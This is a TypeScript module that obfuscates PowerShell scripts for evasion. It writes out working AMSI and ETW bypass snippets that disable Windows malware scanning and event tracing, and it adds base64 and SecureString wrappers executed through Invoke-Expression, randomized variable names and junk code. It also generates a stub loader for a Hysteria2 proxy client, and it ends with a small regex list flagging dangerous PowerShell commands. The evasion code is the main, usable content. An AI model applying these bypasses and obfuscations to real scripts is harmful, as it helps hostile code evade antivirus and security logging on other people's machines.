/* ------------------------------------------------------------------ */
/*  PowerShell Obfuscation Module                                     */
/* ------------------------------------------------------------------ */

export interface PowerShellObfuscationOptions {
  enabled: boolean
  level: "light" | "medium" | "heavy"
  techniques: string[]
}

export interface ObfuscationResult {
  obfuscatedScript: string
  techniques: string[]
  metadata: {
    originalLength: number
    obfuscatedLength: number
    compressionRatio: number
  }
}

/**
 * Obfuscate PowerShell script with multiple techniques
 */
export async function obfuscatePowerShell(
  script: string,
  options: PowerShellObfuscationOptions
): Promise<ObfuscationResult> {
  if (!options.enabled) {
    return {
      obfuscatedScript: script,
      techniques: [],
      metadata: {
        originalLength: script.length,
        obfuscatedLength: script.length,
        compressionRatio: 1,
      },
    }
  }

  let obfuscated = script
  const appliedTechniques: string[] = []

  // Apply techniques based on configuration
  if (options.techniques.includes("string_encode")) {
    obfuscated = applyStringEncoding(obfuscated)
    appliedTechniques.push("string_encode")
  }

  if (options.techniques.includes("variable_rename")) {
    obfuscated = applyVariableRenaming(obfuscated)
    appliedTechniques.push("variable_rename")
  }

  if (options.techniques.includes("control_flow")) {
    obfuscated = applyControlFlowFlattening(obfuscated)
    appliedTechniques.push("control_flow")
  }

  if (options.techniques.includes("amsi_bypass")) {
    obfuscated = applyAmsiBypass(obfuscated)
    appliedTechniques.push("amsi_bypass")
  }

  if (options.techniques.includes("etw_bypass")) {
    obfuscated = applyEtwBypass(obfuscated)
    appliedTechniques.push("etw_bypass")
  }

  // Apply level-specific additional obfuscation
  if (options.level === "medium" || options.level === "heavy") {
    obfuscated = applyBase64Encoding(obfuscated)
    appliedTechniques.push("base64_encoding")
  }

  if (options.level === "heavy") {
    obfuscated = applySecureString(obfuscated)
    appliedTechniques.push("secure_string")
    obfuscated = applyWhitespaceObfuscation(obfuscated)
    appliedTechniques.push("whitespace_obfuscation")
  }

  return {
    obfuscatedScript: obfuscated,
    techniques: appliedTechniques,
    metadata: {
      originalLength: script.length,
      obfuscatedLength: obfuscated.length,
      compressionRatio: script.length / obfuscated.length,
    },
  }
}

/**
 * Apply string encoding technique
 */
function applyStringEncoding(script: string): string {
  // Replace string literals with character arrays
  return script.replace(/"([^"]{4,})"/g, (match, content) => {
    if (content.includes("$") || content.includes("{")) return match // Avoid replacing variables
    const chars = content.split("").map((c) => `[char]${c.charCodeAt(0)}`).join(" + ")
    return `(${chars})`
  })
}

/**
 * Apply variable renaming technique
 */
function applyVariableRenaming(script: string): string {
  const variableMap = new Map<string, string>()
  let counter = 0

  // Find and replace variable names
  return script.replace(/\$([a-zA-Z_][a-zA-Z0-9_]*)/g, (match, varName) => {
    // Skip built-in PowerShell variables
    const builtInVars = ["true", "false", "null", "env", "args", "error", "host", "home", "pid", "pwd", "PSItem"]
    if (builtInVars.includes(varName)) return match

    if (!variableMap.has(varName)) {
      const newName = `$${generateRandomVarName(counter++)}`
      variableMap.set(varName, newName)
    }
    return variableMap.get(varName)!
  })
}

/**
 * Generate random variable name
 */
function generateRandomVarName(counter: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz"
  let name = ""
  for (let i = 0; i < 6; i++) {
    name += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return `${name}${counter}`
}

/**
 * Apply control flow flattening
 */
function applyControlFlowFlattening(script: string): string {
  // Add junk control flow statements
  const junkStatements = [
    "$null = $null",
    "$false = $false",
    "$true = $true",
    "[void]$null",
    "$x = 0; if ($x -eq 0) { $x }",
  ]

  const lines = script.split("\n")
  const obfuscatedLines: string[] = []

  lines.forEach((line, index) => {
    obfuscatedLines.push(line)
    // Insert junk statements every few lines
    if (index > 0 && index % 3 === 0) {
      const randomJunk = junkStatements[Math.floor(Math.random() * junkStatements.length)]
      obfuscatedLines.push(randomJunk)
    }
  })

  return obfuscatedLines.join("\n")
}

/**
 * Apply AMSI bypass technique
 */
function applyAmsiBypass(script: string): string {
  const amsiBypass = `
# AMSI Bypass
$Ref = ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'))
$Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
`
  return amsiBypass + script
}

/**
 * Apply ETW bypass technique
 */
function applyEtwBypass(script: string): string {
  const etwBypass = `
# ETW Bypass
$Ref = ([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider'))
$Ref.GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
`
  return etwBypass + script
}

/**
 * Apply base64 encoding
 */
function applyBase64Encoding(script: string): string {
  const encoded = Buffer.from(script).toString("base64")
  return `$encoded = '${encoded}'; $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)); Invoke-Expression $decoded`
}

/**
 * Apply SecureString technique
 */
function applySecureString(script: string): string {
  const encoded = Buffer.from(script).toString("base64")
  return `$secStr = ConvertTo-SecureString '${encoded}'; $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secStr); $decoded = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ptr); Invoke-Expression $decoded`
}

/**
 * Apply whitespace obfuscation
 */
function applyWhitespaceObfuscation(script: string): string {
  // Add random whitespace and comments
  return script
    .split("\n")
    .map((line) => {
      if (line.trim().length === 0) return line
      const randomWhitespace = " ".repeat(Math.floor(Math.random() * 20))
      const randomComment = Math.random() > 0.7 ? ` # ${generateRandomComment()}` : ""
      return randomWhitespace + line + randomComment
    })
    .join("\n")
}

/**
 * Generate random comment
 */
function generateRandomComment(): string {
  const comments = [
    "Initialize variable",
    "Process data",
    "Execute operation",
    "Load configuration",
    "Setup environment",
  ]
  return comments[Math.floor(Math.random() * comments.length)]
}

/**
 * Generate Hysteria2 PowerShell client loader
 */
export function generatePowerShellLoader(config: {
  server: string
  auth: string
  obfs?: string
}): string {
  const { server, auth, obfs } = config

  return `
# Hysteria2 PowerShell Client Loader
param(
    [Parameter(Mandatory=$true)]
    [string]$Server,
    
    [Parameter(Mandatory=$true)]
    [string]$Auth,
    
    [Parameter(Mandatory=$false)]
    [string]$Obfs
)

function Invoke-Hysteria2Client {
    $clientPath = "$env:TEMP\\hysteria2-client.exe"
    
    # Download client (placeholder - in production, this would download from server)
    Write-Host "Downloading Hysteria2 client..."
    
    # Configure client
    $config = @{
        server = $Server
        auth = $Auth
        obfs = $Obfs
    }
    
    # Start client
    Write-Host "Starting Hysteria2 client..."
    # Start-Process $clientPath -ArgumentList $config
}

# Main execution
try {
    Invoke-Hysteria2Client -Server $Server -Auth $Auth -Obfs $Obfs
} catch {
    Write-Error "Failed to start Hysteria2 client: $_"
    exit 1
}
`
}

/**
 * Validate PowerShell script safety
 */
export function validatePowerShellScript(script: string): {
  safe: boolean
  issues: string[]
} {
  const issues: string[] = []

  // Check for dangerous patterns
  const dangerousPatterns = [
    { pattern: /Remove-Item/i, message: "File deletion detected" },
    { pattern: /Format-Volume/i, message: "Disk formatting detected" },
    { pattern: /Stop-Computer/i, message: "System shutdown detected" },
    { pattern: /Restart-Computer/i, message: "System restart detected" },
    { pattern: /Invoke-Expression.*download/i, message: "Suspicious download expression" },
  ]

  dangerousPatterns.forEach(({ pattern, message }) => {
    if (pattern.test(script)) {
      issues.push(message)
    }
  })

  return {
    safe: issues.length === 0,
    issues,
  }
}